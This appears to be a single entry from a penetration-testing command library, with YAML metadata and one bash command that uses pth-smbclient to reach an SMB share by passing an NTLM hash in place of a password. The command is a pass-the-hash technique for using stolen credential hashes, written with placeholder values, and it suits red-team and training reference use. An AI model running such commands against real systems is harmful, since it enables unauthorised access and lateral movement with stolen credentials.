---
id: bf0f94a1-39fc-4eae-bf17-85b591063e79
name: connect to target-share and auth via ntlm-hash
type: command
executor: bash
data: 'pth-smbclient --user=username --pw-nt-hash -m smb3 \\\\target-ip\\target-share
  ntlm-hash

  '
output: null
created_at: '2020-07-14T18:14:42.952136+00:00'
updated_at: '2023-05-29T16:48:52.884824+00:00'
---

# connect to target-share and auth via ntlm-hash

```bash
pth-smbclient --user=username --pw-nt-hash -m smb3 \\\\target-ip\\target-share ntlm-hash

```
